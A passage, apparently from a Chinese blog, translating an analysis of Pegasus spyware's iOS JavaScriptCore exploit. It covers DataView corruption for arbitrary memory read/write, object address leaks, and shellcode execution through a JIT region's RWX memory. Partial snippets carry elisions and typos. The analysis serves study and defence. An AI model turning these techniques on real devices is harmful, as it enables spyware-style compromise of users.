<p>首先，使用虚拟<code>ArrayBuffer</code>作为两者的后备向量创建两个DataView。接下来，利用指向<code>dataview_rw</code>的指针来利用该问题来破坏<code>dataview_init_rw</code>的<code>m_vector</code>成员。对<code>dataview_init_rw</code> 后续读取和写入，DataView会让dataview_rw的任一成员泄露或重写。接下来，对该对象的控制用于获得整个进程存储器的读/写原语。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">var DATAVIEW_ARRAYBUFFER_OFFSET = <span class="number">0x10</span>;</span><br><span class="line">var DATAVIEW_BYTELENGTH_OFFSET = DATAVIEW_ARRAYBUFFER_OFFSET + <span class="number">4</span>;</span><br><span class="line">var DATAVIEW_MODE_OFFSET = DATAVIEW_BYTELENGTH_OFFSET + <span class="number">4</span>;</span><br><span class="line">var FAST_TYPED_ARRAY_MODE = <span class="number">0</span>;</span><br><span class="line">dataview_init_rw.setUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, <span class="number">0</span> , <span class="literal">true</span>);</span><br><span class="line">...</span><br><span class="line">dataview_init_rw.setUnit32(DATAVIEW_BYTELENGTH_OFFSET, <span class="number">0xFFFFFFFF</span> , <span class="literal">true</span>);</span><br><span class="line">...</span><br><span class="line">dataview_init_rw.setUnit8(DATAVIEW_MODE_OFFSET, FAST_TYPED_ARRAY_MODE, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>向dataview_rw DataView中写入三个偏移量。首先，指向后备向量的指针指向零地址。然后将DataView的长度设置为<code>0xFFFFFFFF</code>，有效地设置DataView以映射进程的所有虚拟内存。最后，将模式设置为简单类型（即<code>FastTypedArray</code>），允许在给定虚拟地址的情况下将偏移量计算到DataView中。<code>dataview_rw DataView</code>现在通过它公开的getType和setType方法提供任意读/写原语。</p>
<h4 id="泄漏对象地址"><a href="#泄漏对象地址" class="headerlink" title="泄漏对象地址"></a>泄漏对象地址</h4><p>所需的最后一个原语可以暴露任意JavaScript对象的虚拟内存地址。使用上面利用的相同问题来泄漏单个对象的地址而不是暴露整个存储器空间来实现该原语。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">var dummy_ab = <span class="keyword">new</span> ArrayBuffer (<span class="number">0x20</span>);</span><br><span class="line">...</span><br><span class="line">var dataview_leak_addr = <span class="keyword">new</span> DataView ( dummy_ab);</span><br><span class="line">var dataview_dv_leak = <span class="keyword">new</span> DataView (dummy_ab);</span><br><span class="line">setImpureGetterDelegate (dataview_dv_leak, dataview_leak_addr);</span><br><span class="line">...</span><br><span class="line">setImpureGetterDelegate (dataview_leak_addr, object_to_leak );</span><br><span class="line">leaked_addr = dataview_dv_leak.getUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, ture);</span><br></pre></td></tr></table></figure>
<p>同样，使用虚拟ArrayBuffer作为两者的支持向量创建两个DataView。接下来，用指向<code>dataview_leak_addr</code>的指针来利用该问题去破坏<code>dataview_dv_leak</code>的<code>m_vector</code>成员。为泄漏任意JavaScript对象的地址，第二次触发该问题。这次，dataview_leak_addr DataView的m_vector被需泄露的对象的地址代替。最后，可以读取<code>dataview_dv_leak DataView</code>中偏移16个字节的dword以获取目标对象的地址。</p>
<h4 id="未签名的本机代码执行"><a href="#未签名的本机代码执行" class="headerlink" title="未签名的本机代码执行"></a>未签名的本机代码执行</h4><p>如第1阶段Safari漏洞利用中所使用的那样，Pegasus在本攻击中使用相同的机制来获取代码执行权限。该漏洞创建了一个可执行映射，其中包含要执行的shellcode。为了实现这个目的，创建了一个JSFunction对象（含有数百个空的try / catch块，稍后将被覆盖）。为了帮助确保JIT将JavaScript编译为本机代码，随后会重复调用该函数。鉴于JavaScriptCore库的性质，此JIT编译的本机代码将驻留在映射为读/写/执行的内存区域中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">var body =<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">for</span> (var k=<span class="number">0</span>; k&lt;<span class="number">0x600</span>; k++)&#123;</span><br><span class="line">	body+= &#x27;try () catch(e) ();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">var to_overwrite = <span class="keyword">new</span> Function(<span class="string">&#x27;a&#x27;</span>, body);</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">	to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后可以读取此JSFunction对象的地址，并且可以读取各种成员以获取RWX映射的地址。然后用shellcode覆盖JITed try / catch块，并且可以简单地调用<code>to_overwrite（）</code>函数来实现任意代码执行。</p>
]]></content>
      <tags>
        <tag>ios</tag>
      </tags>
  </entry>
</search>
